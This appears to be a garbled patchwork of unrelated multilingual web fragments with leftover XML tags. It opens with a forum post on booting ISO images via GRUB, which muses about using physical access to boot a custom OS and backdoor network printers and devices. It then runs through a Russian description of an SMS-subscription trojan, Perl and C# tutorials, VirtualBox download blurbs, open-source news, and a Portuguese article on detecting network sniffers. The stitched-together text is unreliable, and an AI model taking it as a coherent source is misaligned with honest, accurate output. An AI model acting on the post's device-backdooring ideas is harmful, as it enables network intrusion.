How to use grub with the stage1_5 iso9660 to be able to read iso filesystems.. this leads to the possibility of moving the iso file to a specific area on the hard drive and load the iso file as if it were a device..
How to pass control from the boot-loader, to the boot-manager, to the boot-loader on the iso filesystem.  This is my #1 goal.  Make it look to the iso filesystem that besides the fact that its a file and not a cd, that a previous boot-loader didn't chain-load to it.  IOW, that it is a fresh boot that received its control directly from the BIOS. stupid f'in BIOS! How easy it is to boot from a CD-server serving iso files as cd's, on a nearby pc.
How to use the ability of boot-loaders to register and load code into memory much like loop devices, to load and register the code for an iso filesystem, in a looping fashion.
How to use vmware to install an iso using the "use actual harddisk" method, how to use this on a partition, safely, and how to transfer entire partition images byte by byte.



I am doing a lot of code hacking and if I don't find an easy (for all linux skill levels) solution soon with one of the boot-loaders, I am looking at having to write one myself.. something I REALLY STRONGLY do not want to do. Any suggestions are welcome.  
Also, looking at how the pre-root root, that grub loads and then mounts the kernel from it, how can I add the loop option to tthe mount command used.  This happens all transparently for th euser, so I know I have to hack it out.. But is it possible to use a looped fs? without a mounted HD?  with a mounted HD that the original looped iso is mounted on? 

Also looking at using the ramdisk initrd to load some type of custom program that allows me to mount a looped fs on the pre-root, (or root). 
Looking at GRUB2 code has helped a lot.  I also like the Ranish Partition Manager.. 
ONCE AND FOR ALL, lilo just can't compare AT ALL to grub or Ranish Partition Manager.  I bet people only use it because of the "first love" syndrome. eh? 
At any rate, I'm learning a lot, and many of the results I will find I will post here eventually, because they are HUGE lee important for the security community. 
A couple months ago, I stumbled across two incredible programs that I have used over and over again in awe.  After getting over my greediness of wanting to keep them to  myself.. here you go.. enjoy! 
The home page for these tools EasyBoot and UltraISO. 

Some Uses Ive Explored: 

Copying all my system CD's and install CD's to my HD.
Modifying my XP Restore CD's to be current and streamlined with XP SP2 and include my favorite windows programs.
Creating a custom grub boot CD with extra and unique capabilities.
Viewing the construction of all major Operating System's Boot Loader Code and related code.


Suggestions for use: 

Read the product documentation thoroughl
Get a good hexeditor/viewer
Read a bunch of threads in the forum
Begin use

If you need to hack the physical security of a computer.. there isnt really a much better way of doing it than what is referenced in the phrack article and in the posts above.  There is also the possiblity of breaking the physical security at 1 computer and booting up your custom files.. and then use your custom loaded OS to configure devices network-wide.. using BOOTP/DHCP/tftp/etc. protocols..  A lot of networked printers and devices would rapidly fall to this method...  configure the newly captured printers/devices to open a backdoor back into the local network remotely for you automatically, even after your custom OS is unloaded..  with the increase use of wireless devices and PnP devices like USB, protecting the physical security will become much more important in the future. 
Ive also noticed that booting a pc could be as easy as a usb key, or using a usb upstream/downstream hub to self-boot, just think of all the memory cards and other proprietary type access points there are.. 
If I can boot your machine, your security is about none.  Scarry. 
Sounds like fun

Этот троянец блокирует доступ на некоторые сайты, мошенническим путем вынуждая пользователя оформить платную подписку на различные услуги.При запуске троянец Trojan.BrowseBan.480 проверяет, какие браузеры установлены на компьютере пользователя, а затем сохраняет на диск модули, в которых реализована его вредоносная функциональность. Для браузера Microsoft Internet Explorer модуль реализован в виде файла динамической библиотеки, для Mozilla Firefox, Opera и Google Chrome — специального плагина, для функционирования которого троянец изменяет пользовательские настройки программы.В результате, при попытке открытия определенных сайтов в окне браузера троянец модифицирует отображаемую веб-страницу, и на экране компьютера демонстрируется окно, в котором пользователю предлагается ввести номер мобильного телефона, а затем — код, полученный в ответном СМС-сообщении. Таким образом, жертва соглашается с условиями подписки, согласно которым со счета ее мобильного телефона регулярно будет списываться определенная сумма.С недавних пор операторы «большой тройки» при подключении абонента к платным сервисам стали использовать специальные веб-страницы с информацией об условиях предоставляемых услуг и их стоимости. Поэтому для осуществления подписки Trojan.BrowseBan.480 использует официальные сервисы мобильных операторов «МТС» (moipodpiski.ssl.mts.ru) и «Билайн» (signup.beeline.ru), однако вредоносный скрипт скрывает «лишнюю» информацию, вследствие чего жертва видит лишь диалоговое окно, содержащее форму для ввода номера мобильного телефона. Например, вот так должна выглядеть страница оформления подписки, демонстрируемая оператором мобильной связи:   А вот что видит пользователь компьютера, инфицированного Trojan.BrowseBan.480:   Причем злоумышленники не поленились разработать уникальный дизайн окна для различных сайтов, которые может посетить жертва: среди них — страницы социальных сетей «ВКонтакте», «Одноклассники», «Мой мир», Facebook, популярные поисковые системы, почтовые службы «Яндекс.Почта», Gmail, Mail.ru, а также другие популярные ресурсы. Подписку осуществляет контент-провайдер ООО «Пластик Медиа», а оплата взимается якобы за доступ к службе анонимайзера 4anonimz.ru, однако в силу того, что троянец скрывает подробную информацию о подписке, жертва об этом даже не догадывается.

  <summary><![CDATA[Kazu za Perl da je komplikovan programski jezik za ucenje. Da im ne verujemo na rec, bar za "Zdravo Svete" :)  Otvorite editor koji koriste i u njemu napisite sledece. Ali pre svega - poenta je da pisete source vi, a ne da uradite copy > paste.  #!/usr/bin/perl print "Zdravo Svete\n"; Posto ovo kucam na OpenBSD-u, snimicu programcic kao pozdrav.pl u direktorijum /home.  Ako program nece da se pokrene, probajte sa komandom:  #chmod a+x pozdrav.pl Ukoliko niste snimili program sa ekstenzijom .pl , to nije problem. Unix-oliki sistemi automatski prepoznaju sta treba da rade, pa mozete koristi i ovo:  #chmod a+x pozdrav Kad zavrsite sa prethodnim komandama kojima vas program postaje "izvrsiv", pokusajte program pokrenuti sa:  #./pozdrav Malo detaljnije o programcicu, da vidimo opet source:   #!/usr/bin/perl print "Zdravo Svete\n"; #!/usr/bin/perl - ovo je takozvana "shebang"  linija. Ona govori sistemu u kom ste programskom jeziku pisali source.  Tu nista nema za dodati i oduzeti, jednostavno shebang linija je  standard. Onda ide uvek u vrh programa.  print - ovo je Perl-ova komanda kojom se stampa tekst na ekran. Postoji jos mnogo komandi za razne namene.  Zdravo Svete - ovo je neki tekst koji se stampa. Mozete ubaciti koja god hocete slova i brojeve izmedju navodnika.   \n"; - se stavlja na kraju komande obavezno. Ovo "\n" je komanda za prelazak u novi red tako da tekst bude u linijama (red po red), a ne sve recenice jedna do druge.]]></summary>

Development of  OpenOffice.org was sponsored primarily by Sun Microsystems, which used  the code as the basis for subsequent versions of StarOffice.  After acquiring Sun in 2010, Oracle Corporation briefly continued developing OpenOffice.org and StarOffice, which it  renamed Oracle Open Office. In September 2010, members of the  OpenOffice.org development team left to form "The Document Foundation," which eventually published LibreOffice based on the Open Office source code. In 2011, Oracle stopped supporting commercial development due to the community leaving[23] and contributed the suite to the Apache Incubator to become a project of the Apache Software Foundation.[24][25] As of December 2011, the project is officially known as Apache OpenOffice.[26]   OpenOffice.org 1OpenOffice.org 1.0 was released under both the LGPL and the Sun Industry Standards Source License (SISSL).[19] Versions for Windows, Linux and Solaris were released on 1 May 2002.[27][28][29] The version for MacOS X (X11) was released on 23 June 2003.[30][31]  OpenOffice.org 1.1 introduced One-click Export to PDF and can Export  presentations to Flash (.SWF). It also added the 3rd Party Add-ons  ability.[32]   OpenOffice.org 2Work on version 2.0 began in early 2003 with the following goals: better interoperability with Microsoft Office; better performance, with improved speed and lower memory usage; greater scripting capabilities; better integration, particularly with GNOME;  an easier-to-find and use database front-end for creating reports,  forms and queries; digital signatures (only in ODF forma]]></summary>

  <summary><![CDATA[“Un sistema operativo nuevo e independiente dentro de tu PC”  ¿Quieres probar un programa pero no te atreves por si dañas tu sistema operativo? ¿Te gustaría tener otro sistema operativo pero sin quitar el tuyo? ¿Imaginas probar Windows 7 desde tu XP?  Todo esto es posible con VirtualBox, una utilidad gratuita que crea un ordenador virtual dentro del tuyo, con su sistema operativo totalmente independiente.  De esta forma, podrás crear 'máquinas virtuales' con diferentes sistemas operativos o incluso un Linux. Todo desde tu sistema operativo actual.  Para utilizar VirtualBox, primero deberás conseguir o crear tu mismo una máquina virtual del sistema operativo que desees, después, cargarla con el programa y listo, arrancará como si de un nuevo sistema operativo se tratase.  Por cierto, VirtualBox no ocupa demasiado, pero ten presente que las máquinas virtuales suelen ocupar bastante espacio, fácilmente de cuatro a seis gigabytes. VirtualBox soporta los siguientes formatos:  Sistemas operativos virtuales: Windows ( NT 4.0, 2000, XP, Server 2003, Vista, Server 2008, 7), DOS/Windows 3.x, Linux (Kernel 2.4 y 2.6), FreeBSD/OpenBSD, Solaris 10, OS/2, etc.  """"""""""""""""""""""""""" Para 32 bits  Sistema:Xp/Vista/7 Idioma:Español.Multilenguaje Tamaño:67.8 MB  DESCARGAR DE: Uploaded | bitshare | cloudzer | depositfiles   Para descargar esperar 5 segundos y dar click en la pestaña de saltar publicidad   """"""""""""""""""""""""""" Para 64 bits  Sistema:Xp/Vista/7 Idioma:Español.Multilenguaje Tamaño:77.27 MB  DESCARGAR DE: Uploaded | bitshare | cloudzer | depositfiles   Para descargar esperar 5 segundos y dar click en la pestaña de saltar publicidad]]></summary>

  <title><![CDATA[PHP neler yapabilir?]]></title>
  <summary><![CDATA[PHP neler yapabilir?Her şeyi. PHP temel olarak sunucu-taraflı programlamaya odaklanmıştır, bu nedenle CGI uygulamalarının yaptığı her şeyi, örneğin formdan veri toplama, devingen sayfa içeriği oluşturma, ya da çerez alıp gönderme gibi işlemleri yapabilirsiniz. Ancak PHP bunlardan çok daha fazlasını yapabilecek yetenektedir.PHP betiklerinin kullanıldığı başlıca üç alan vardır.Sunucu-taraflı programlama. Bu PHP için en geleneksel ve en temel olan alandır. Sunucu-taraflı programlama için üç şeye sahip olmanız gerekir. PHP çözümleyici (CGI ya da sunucu modülü), bir HTTP sunucusu ve bir tarayıcı. PHP programlamada deneyimliyseniz tüm bunları evinizdeki makinede çalıştırabilirsiniz. Yapılandırma ve Kurulum bölümünden bununla ilgili daha fazla bilgiye ulaşabilirsiniz.Komut satırı uygulamaları. Bir PHP uygulamasını komut satırından hiçbir sunucu ya da tarayıcı uygulama kullanmadan çalıştırabilirsiniz. Burada tek ihtiyacınız olan PHP çözümleyicidir. Bu tür kullanım cron üzerinden (Windows eşdeğeri görev yöneticisi) düzenli çalıştırılan işlemler ya da basit metin işleme görevleri için idealdir. PHP'nin komut satırında kullanımı bölümünde daha ayrıntılı bilgiye ulaşaşabilirsiniz.Masaüstü uygulamalarının yazımı. PHP için görsel uygulamaların yazılabileceği en iyi dil diyemeyiz, ancak PHP'yi iyi biliyorsanız ve PHP'nin birtakım ileri seviye özelliklerini kendi istemci taraflı uygulamalarınızda kullanmak istiyorsanız, PHP-GTK eklentisini bu tip programlar yazmak için kullanabilirsiniz. Bu şekilde platformdan bağımsız uygulamalar yazma şansına da kavuşacaksınız. PHP-GTK, PHP için bir eklentidir ve ana dağıtımda yer almaz. PHP-GTK ilginizi çektiyse,» kendi sitesini ziyaret edebilirsiniz.PHP bütün büyük işletim sistemlerinde, Linux, birçok Unix türevi (HP-UX, Solaris, OpenBSD vb.), Microsoft Windows, Mac OS X, RISC OS dahil olmak üzere çok çeşitli platformlarda çalışabilir. PHP benzer biçimde bugün yaygın biçimde kullanılan HTTP sunucularının büyük kısmını destekler. Bunlara Apache, IIS ve daha birçok sunucuyu örnek gösterebiliriz. Bunlara FastCGI PHP çalıştırılabilirini kullanan lighttpd ve nginx gibi sunucular da dahildir. PHP modül olarak kullanılabildiği gibi bir CGI işleyici olarak da çalıştırılabilir.Sonuç olarak, PHP ile işletim sistemi ve HTTP sunucusu seçme özgürlüğüne sahipsiniz. Dahası, hangi programlama yöntemini kullanacağınıza, işlevsel yaklaşımı mı yoksa nesne yönelimli yaklaşımı mı yoksa her ikisini birden mi kullanacağınıza kendiniz karar verebilirsiniz.PHP'nin yetenekleri yalnızca HTML çıktı üretmekle sınırlı değildir. PHP'nin yetenekleri arasında resim çıktısı üretebilme, PDF oluşturabilme ve hatta Flash filmleri oluşturabilme (libswf ve Ming kullanarak) bulunmaktadır. Aynı şekilde XHTML ya da XML gibi her tür metin tabanlı dosyayı oluşturabilmeniz mümkündür. PHP bu dosyaları özdevinimli olarak oluşturabilir ve ekrana yazdırmanın yanında sizin için dosya sisteminde saklayabilir, böylece devingen içeriğiniz için sunucu-taraflı bir depo sistemini kullanımınıza sunabilir.PHP'nin en güçlü ve en çok üstünde durulan özelliklerinden biri, sahip olduğu geniş ve gelişmiş veritabanı desteğidir. Veritabanlarına özgü eklentilerden birini (örn. mysql) kullanarak veya PDO gibi bir soyutlama katmanı kullanarak PHP ile veritabanı bağlantılı site sayfaları oluşturmak ya da ODBC eklentisi üzerinden bu standardı destekleyen bir bağlantı açmak son derece basittir. Diğer veritabanları için cURL eklentisi veya soketler (CouchDB gibi) kullanılabilir.PHP, farklı hizmetlerle LDAP, IMAP, SNMP, NNTP, POP3, HTTP, COM (Windows için) ve daha sayısız protokol aracılığıyla iletişim kurabilecek bir altyapıya da sahiptir. Hazır modüllerin haricinde ham ağ soketleri açıp bu soketler üzerinden istediğiniz bütün protokollerle çalışabilirsiniz. PHP, WDDX üzerinden sanal olarak sanal doku üzerinde hangi dilde yazılmış olursa olsun tüm uygulamalarla haberleşebilir. Ayrıca Java nesnelerinin oluşturulabilmesi ve şeffaf biçimde PHP nesneleri olarak kullanılabilmeleri önemli bir diğer özelliktir.PHP oldukça faydalı belge işleme özelliklerine sahiptir. Bu yelpaze Genişletilmiş POSIX ya da Perl düzenli ifade komutlarından (PCRE) XML dosyalarını okumaya ve çözümlemeye kadar uzanır. PHP tüm XML uzantılarını libxml2 tabanında tek bir standartta toplamış ve SimpleXML ile XMLReader ve XMLWriter desteğini de bünyesine katarak sunduğu imkan yelpazesini genişletmiştir.Alfabetik olarak ve sınıflandırılarak belgelenmiş daha pek çok ilginç eklenti vardır. Bunlara ek olarak » XDebug gibi PHP kılavuzu içinde belgelenmiş ya da belgelenmemiş PECL eklentileri de mevcuttur.Sizin de görebildiğiniz gibi bu sayfa PHP'nin sunabileceği bütün özellikleri ve faydaları anlatabilmek için yeterli değil. Yapılandırma ve Kurulum bölümünde ve İşlev başvuru kılavuzunda listelenen eklentilerin başlangıç bölümlerindeki açıklamalardan her bir eklenti için daha fazla bilgiye ulaşabilirsiniz.]]></summary>

  <title><![CDATA[Google WiFi free]]></title>
  <summary><![CDATA[Google irá oferecer nesse verão, acesso gratuito a internet Wireless para você ficar perto de todos os seus amigos. Sejam aqueles à distância ou até os no smartphone ao lado. 
http://brasilfreewifi.withgoogle.com/ 
 
O Google irá oferecer acesso Wi-Fi gratuito em 150 bares de sete cidades brasileiras a partir deste sábado, 15/12. O projeto, batizado de Free WiFi, permitirá o acesso à internet a partir de smartphones, tablets ou computadores. Ao ativar o Wi-Fi no dispositivo, o aparelho irá identificar a rede do Google e, no primeiro acesso, o navegador web irá exibir alguns produtos da empresa com sugestão para baixa-los. A partir daí o uso dentro do estabelecimento passa a ser ilimitado. 
Segundo o Google, a conexão utilizada será entre 10 Mbps ou 30 Mbps, dependendo do tipo de rede utilizada pelo bar (Wi-Fi ou fibra óptica, respectivamente), e será compartilhada entre todos os clientes do estabelecimento. Não haverá, ainda de acordo com a companhia, nenhum tipo de limitação ou restrição para a navegação. 
Os 150 bares participantes estão listados no site oficial do projeto e podem ser encontrados nas cidades de São Paulo, Rio de Janeiro, Belo Horizonte, Curitiba, Porto Alegre, Florianópolis e Campinas. A iniciativa, exclusiva para o Brasil, foi criada pelo Google em parceria com a Enox On-Life Media e terá duração de 90 dias.]]></summary>

  <title><![CDATA[Lançada a Edição 2 da revista LibreOffice Magazine Brasil]]></title>
  <summary><![CDATA[Você está esperando Papai Noel e, também, a segunda edição da nossa revista? Ficará surpreso, pois ela chegou primeiro que o Bom velhinho. Depois da primeira edição, que saiu graças a um grupo de voluntários que resolveu colocar a mão na massa e encarar algumas horas – extras e sem renumeração, em atividades diferentes de sua rotina diária, estamos presenteando todos com a edição de dezembro. 
Com o lançamento da revista descobrimos que ela estava sendo aguardada. E por causa disso, a adrenalina subiu, e foi muito bom sair à caça de pessoas que possam colaborar, com a atual e as futuras edições, falando de Software Livre e código aberto, de iniciativas livres, inclusão digital, além é claro, do LibreOffice. 
Nessa edição, há um tutorial bastante completo sobre fotos panorâmicas. E sobre a inteligência do seu negócio ou melhor, Inteligência Empresarial podemos dar uma dica apresentando o Pentaho, que promete ser assunto nas próximas edições. 
Sobre o ponto de vista de governos apresentamos dois casos. O primeiro, é um caso de sucesso da cidade de Guarulhos em São Paulo. A administração da cidade desenvolveu uma distribuição baseada no Debian/Ubuntu, chamada Guarux, para sanar suas necessidades de utilização de Software Livre em seus órgãos administrativos, como também no trabalho de Inclusão digital, ponto forte da cidade. O segundo caso, é muito interessante para a sociedade em geral pois o governo federal, esta disponibilizando uma ferramenta para que qualquer pessoa possa encontrar facilmente dados e informações sobre temas como saúde complementar, sistema de transporte, segurança pública, indicadores de educação, gastos governamentais e por ai vai. Quem nos conta o começo de tudo são jovens participantes do chamado time de dados abertos. Sobre o Zimbra, temos a continuação do artigo, agora com tutorial sobre instalação e configuração. 
E falando de LibreOffice temos um artigo da Cooperativa de Consumo que é uma evidência de como Software Livre entra na “veia”. Por necessidade, começaram a utilizar o pacote de escritório – quando ainda era OpenOffice.org. Foi necessário dar treinamentos presenciais para seus colaboradores e a medida que seu parque computacional foi aumentando, passaram a trabalhar em rede e, os treinamentos foram disponibilizados pela internet. E depois de um tempo, disponibilizados para qualquer cidadão. 
Outro artigo motivador e o que fala do uso do LibreOffice como coadjuvante do TuxPaint, na alfabetização de alunos. E saiba o que aconteceu com duas cidades na Alemanha quando resolveram migrar para o OpenOffice/LibreOffice. E há um tutorial – matador, que tenho certeza que vai agradar aos estudantes que tem que apresentar o famoso TCC, utilizando-se das normas da ABNT. E mais dicas sobre o nosso motivador: LibreOffice. 
E se depois de ler a revista, sentir vontade, ajude-nos a continuar oferecendo conteúdo sobre o mundo livre a todos os leitores. Colabore, escrevendo e divulgando. 
Desejamos que o Papai Noel traga muitos presentes, mas se não for possível, ganhe conhecimento. Não custa nada e só multiplica suas possibilidades. 
Boa leitura!. 
Vera Cavalcante

DESCRIPCIÓN
¿Quieres probar un programa pero no te atreves por si dañas tu sistema operativo? ¿Te gustaría tener otro sistema operativo pero sin quitar el tuyo? ¿Imaginas probar Windows Vista desde tu XP? Todo esto es posible con VirtualBox, una utilidad gratuita que crea un ordenador virtual dentro del tuyo, con su sistema operativo totalmente independiente. De esta forma, podrás crear ‘máquinas virtuales’ con diferentes sistemas operativos y así tener a tu disposición un Windows 95, un Vista, un 2000 un XP o incluso un Linux. Todo desde tu sistema operativo actual. Para utilizarlo, primero deberás conseguir o crear tu mismo una máquina virtual del sistema operativo que desees, después, cargarla con el programa y listo, arrancará como si de un nuevo sistema operativo se tratase. Por cierto, el programa no ocupa demasiado, pero ten presente que las máquinas virtuales suelen ocupar bastante espacio, fácilmente de cuatro a seis gigabytes. 
Sistemas operativos virtuales 

Windows (98, NT 4.0, 2000, XP, Server 2003, Vista, Server 2008), DOS/Windows 3.x
Linux (Kernel 2.4 y 2.6), FreeBSD/OpenBSD, Solaris 10, OS/2, etc.

Polecamy  Netfix — bezpłatna pomoc dla naszych czytelnikówZdajemy sobie sprawę, że nie każdy ma doktorat z informatyki, nie dla wszystkich komputer i Internet to całe ich życie :-) Czasami może się więc zdarzyć, że zwyczajnie będziemy potrzebować pomocy kogoś, kto po prostu się na tym zna i obsługą systemu oraz oprogramowania zajmuje się na co dzień, zawodowo. Wychodząc naprzeciw tym problemom uruchomiliśmy niedawno bezpłatną, dostępną dla wszystkich naszych czytelników usługę pomocy technicznej Netfix. Konsultanci usługi Netfix pomogą Ci znaleźć interesujący Cię program w katalogu naszego portalu. Możemy go też od razu pobrać i zainstalować na Twoim komputerze, przy okazji pokazując Ci jak go uruchomić. Jeśli masz kłopot z instalacją samodzielnie pobranego programu albo przeciwnie - nie wiesz, jak dany program odinstalować, również pomożemy. Rozwiązujemy także problemy z nieudanymi i niedokończonymi instalacjami czy deinstalacjami, które uniemożliwiają poprawną pracę w systemie. Jeśli masz problem związany z infekcją wirusa, awarią konkretnego programu lub utratą danych, podpowiemy Ci co możesz zrobić, aby szybko się z tym uporać.   Najciekawsze aktualności  The Linux Foundation podsumowuje rok 2012 Zbliża się koniec roku, więc i The Linux Foundation podsumowuje 12 miesięcy swojej (i nie tylko) działalności. Czy 2012 można nazwać rokiem Linuksa? Może troszkę, bo jeśli wierzyć statystykom zebranym przez NetMarketShare (na podstawie identyfikatora przeglądarki), jest zainstalowany na większej liczbie komputerów niż Windows 8. Z pewnością był to rok kolorowy. Fundacja przygotowała krótkie podsumowanie najważniejszych wydarzeń. Linus Torvalds, twórca systemu Linux, został w tym roku uhonorowany połową Millenium Technology Prize — przyznawanej co dwa lata najważniejszej nagrody za osiągnięcia w dziedzinie technologii, które wpływają pozytywnie na jakość życia, zdrowie i podtrzymanie rozwoju.

Rozwiązanie to pozwala każdemu na swobodne dostosowywanie aplikacji do własnych potrzeb. Aktualnie VirtualBox pracuje zarówno na 32, jak i 64-bitowych systemach Windows i Linux. Obsługuje on wiele typów wirtualnych systemów w tym m.in. Windows NT 4.0/2000/XP/2003/Vista, DOS/Windows 3.x, Linux (2.4 i 2.6) oraz OpenBSD. VirtualBox dostępny jest także w wersji dla przedsiębiorstw - ta jest jednak płatna i licencjonowana na tradycyjnych zasadach.  Wersja otwarta również może być używana komercyjnie, ale nie ma w niej pewnych funkcji określanych jako przydatne głównie przedsiębiorstwom.

  <summary><![CDATA[Jak przygotować system do pisania programów w c#?Słowem wstępuWpis ten zaczyna serię mającą przybliżyć tworzenie programów w języku c#. Wybrałem akurat ten język, gdyż pisane w nim aplikacje można uruchomić na różnych platformach. Oczywiście może to oburzać purystów systemowych ("Linux rządzi", "z dala od Micro*, .Net'u i licencji" itd) lub tych, którzy nie wierzą w Microsoft Community Promise. Ja jednak skupię się głównie na korzyściach płynących z tego języka programowania.Język c# został zaprojektowany dla Microsoftu przez Andersa Hejlsberga (twórca Pascala, pracownika firmy Borland). Niektórzy twierdzą, że ten język programowania jest odpowiedzią Microsoftu na zdobywającą popularność Javę (za PCWorld).  System operacyjnyAplikacje .Net'owe można tworzyć i uruchamiać na wielu różnych systemach operacyjnych. Na Windowsie za pomocą .NetFramework i za pomocą frameworka Mono. To drugie środowisko umożliwia pracę również na systemach takich jak:GNU/Linux,UNIX,Mac OS X,Solaris,FreeBSD,OpenBSD,NetBSD,Wii,PlayStation 3,iOS,Android.Na potrzeby kursu wybrałem czystą wersję instalacyjną systemu Linux - Ubuntu z interfejsem LXDE w wersji 12.04 (Lubuntu 12.04). Wszystkie programy potrzebne do pracy zainstalujemy w trakcie kursu.  IDE - zintegrowane środowisko deweloperskieŚrodowiskiem deweloperskim będzie MonoDevelop (początkowo rozwijany pod nazwą SharpDevelop). Aby zainstalować program MonoDevelop należy otworzyć Centrum oprogramowania Lubuntu (Menu->Narzędzia Systemowe->Centrum oprogramowania Lubuntu), wpisać w oknie wyszukiwania: monodevelop, kliknąć: Dodaj do koszyka, przejść do widoku koszyka i kliknąć: Zainstaluj pakiety. Operację instalacji można przeprowadzić w systemie również za pomocą polecenia wpisanego w terminalu (Ctrl+Alt+t):sudo apt-get install monodevelopW rezultacie, na naszym komputerze, zostanie zainstalowany program MonoDevelop, który można włączyć wybierając z menu pozycję MonoDevelop (Menu->Programowanie->MonoDevelop) lub wpisując monodevelop w oknie Uruchom (Alt+F2). MonoDevelop zainstalowany na Lubuntu 12.04c.d.n...Ciąg dalszy czyli aplikacje konsolowe, okienkowe, obsługa plików, klasy, operacje I/O (w tym obsługa portu szeregowego), komunikacja sieciowa i wiele innych...]]></summary>

Sniffing, em rede de computadores, é o procedimento realizado por uma ferramenta conhecida como Sniffer (também conhecido como Packet Sniffer, Analisador de Rede, Analisador de Protocolo, Ethernet Sniffer em redes do padrão Ethernet ou ainda Wireless Sniffer em redes wireless). Esta ferramenta, constituída de um software ou hardware, é capaz de interceptar e registrar o tráfego de dados em uma rede de computadores. Conforme o fluxo de dados trafega na rede, o sniffer captura cada pacote e eventualmente decodifica e analisa o seu conteúdo de acordo com o protocolo definido em um RFC ou uma outra especificação. 
O sniffing pode ser utilizado com propósitos maliciosos por invasores que tentam capturar o tráfego da rede com diversos objetivos, dentre os quais podem ser citados, obter cópias de arquivos importantes durante sua transmissão, e obter senhas que permitam estender o seu raio de penetração em um ambiente invadido ou ver as conversações em tempo real.

2 Analisador de Protocolos – Wireless
3 Analisador de protocolos – Software Livre
4 Analisadores de Protocolos Dedicados
5 Como Detectar





Port Mirror – Port Spam – Port Monitor
Esta opção é desejável se o administrador da rede pretende conectar um analisador de protocolo diretamente à uma porta do switch, e monitorar o tráfego de outras portas do equipamento. 
Deve-se definir uma porta que será monitorada (Port Mirror) e o seu espelho, que é a porta onde o analisador de protocolo será conectado. 
Uma vez que esta funcionalidade for ativada, todo o tráfego oriundo ou destinado à porta monitorada será espelhado na porta espelho. O Espelhamento de Tráfego torna-se necessário se o administrador de rede não quiser monitorar o tráfego de um determinado segmento, sem modificar as características físicas do segmento monitorado, ao se conectar um analisador de protocolo ao segmento. 
Analisador de Protocolos – Wireless
Existem diversos analisadores de protocolo que funcionam em conexões wireless. Algumas alterações nas configurações do analisador de protocolo em uso, talvez devam ser realizadas, como a habilitação da opção de captura em modo de monitoração, pois o modo promíscuo pode não ser suficiente. 
A captura ocorrerá da mesma maneira que ocorreria se estivesse numa conexão cabeada? O que pode ocorrer é alguma restrição do próprio sistema operacional que se está utilizando, bem como da interface de rede 802.11. A limitação de alguns sistemas operacionais é a de não capturar pacotes que não sejam de dados, o que ocorre também com alguns drivers dos adaptadores de rede. 
É importante mencionar que o fato de uma interface de rede estar executando em modo de monitoração, nem sempre ela estará habilitada para funcionar como uma interface de rede comum, pois ela estará capturando os pacotes em modo passivo. Com isso, as tentativas de resolução de nomes através de um servidor DNS, por exemplo, provavelmente estarão bloqueadas, pois o equipamento não estará habilitado para se comunicar com qualquer DNS server. 
Um dos analisadores de protocolo que funciona em conexões wireless que pode ser citado como exemplo é o “Kismet”. O “Kismet” é uma ferramenta free e que funciona com os sistemas operacionais Linux, FreeBSD, NetBSD, OpenBSD, Mac OS X e Windows. 
Outra ferramenta freeware que pode ser utilizada é o “Wireshark”, uma atualização do tão conhecido Ethereal. De acordo com as especificações dos desenvolvedores, as limitações de captura de pacote através de um dispositivo wireless em modo de monitoração, são as mesmas já citadas: depende do sistema operacional, adaptador de rede e driver em uso. Funciona com os sistemas operacionais Linux, FreeBSD, NetBSD, OpenBSD, Mac OS X, Windows e Solaris. 
Analisador de protocolos – Software Livre
O analisador de protocolos gratuito mais conhecido é o Ethereal, que desde junho de 2006 passou a se chamar Wireshark. O nome pode ser diferente, mas o software é o mesmo. O Wireshark é desenvolvido por especialistas em rede de todo o mundo, mostrando a força dos softwares de código aberto. Este analisador roda em Windows, Linux, UNIX, entre outras plataformas. 
O Wireshark faz análise dos pacotes no momento da recepção e da transmissão das informações, permite organizar os dados de acordo com os protocolos utilizados (suporte para centenas de protocolos), possui função para filtrar apenas os resultados que interessam, exporta os dados capturados para arquivos de texto, além de outras funcionalidades. 
Analisadores de Protocolos Dedicados
A seguir, são descritos dois exemplos de analisadores de protocolos dedicados atualmente comercializados. 
OptiView Series III Integrated Network Analyzer: Fabricado pela empresa Fluke Networks, é um aparelho portátil que tem como função análisar, monitorar e solucionar problemas de redes LAN, WAN, VoIP e WLAN, permitindo ter uma visão geral da rede. Dispõe de recursos de análise de protocolo, análise de dispositivo SNMP e análise de tráfego RMON2, gera relatórios em HTML e dispõe de opções wireless (sem fio), VoIP (Voz sobre IP) e Application Troubleshooting Expert (Especialista em Resolução de Problemas de Aplicativos) para o usuário. 
GigaStor Security Forensics: Fabricado pela Network Instruments, é um analisador de segurança da rede, facilitador da determinação detalhada da natureza do problema. O GigaStor opera como uma câmera de segurança, gravando cada ação que ocorre na rede. Em caso de suspeita de alguma violação da segurança, faz a comparação com milhares de ataques e anomalias de rede, com a funcionalidade de IDS. Faz também análise detalhada no nível do pacote para determinar a origem e o horário da ocorrência. 
Como Detectar
Para detectar um dispositivo sniffer que somente coleta dados e não responde a nenhuma solicitação, é necessário o exame físico de todas as conexões ethernet e a verificação individual das interfaces. 
Um sniffer, rodando em uma máquina, coloca a interface de rede em modo promíscuo com o intuito de capturar todos os pacotes de um determinado segmento. Na maioria dos sistemas Unix é possível detectar uma interface promiscua. 
Note que é possível usar um sniffer em modo não promíscuo, porem somente poderão ser capturados os pacotes endereçados para a máquina onde ele está rodando. 
Para SunOs, NetBSD, e diversos derivados de BSD Unix systems, o comando 

ifconfig -a mostrará informações relativas de todas as interfaces.

lo Link encap:Local Loopback inet addr:127.0.0.0 Bcast:127.255.255.255 Mask:255.0.0.0 UP BROADCAST LOOPBACK RUNNING MTU:2000 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 TX packets:16930 errors:0 dropped:0 overruns:0 eth0 Link encap:10Mbps Ethernet HWaddr 00:80:A8:C3:45:ED inet addr:200.239.53.1 Bcast:200.239.53.255 Mask:255.255.255.0 UP BROADCAST RUNNING PROMISC MTU:1500 Metric:1 ^^^^^^^ RX packets:227622 errors:0 dropped:0 overruns:0 TX packets:282918 errors:0 dropped:0 overruns:0 Interrupt:10 Base address:0×300 
A utilização do comando “ifconfig” no DEC OSF/1, IRIX e em alguns outros Unix, requer que o dispositivo seja especificado. Uma maneira de saber o nome deste dispositivo é utilizar o comando 

netstat -r que mostrará a seguinte saída:

Routinng tables Internet: Destination Gateway Flags Refs Use Interface default iss.net UG 1 24949 le0 localhost localhost UH 2 83 lo0 
Assim, para testar a interface utiliza-se o comando: 

ifconfig le0 le0: flags=8863 inet 127.0.0.1 netmask 0xffffff00 broadcast 255.0.0.1

No Ultrix é possivel detectar o uso de sniffer com os comandos pfstat e pfconfig. pfconfig mostra quem está rodando o sniffer e o pfstat mostra se a interface está ou não em modo promístuo. 
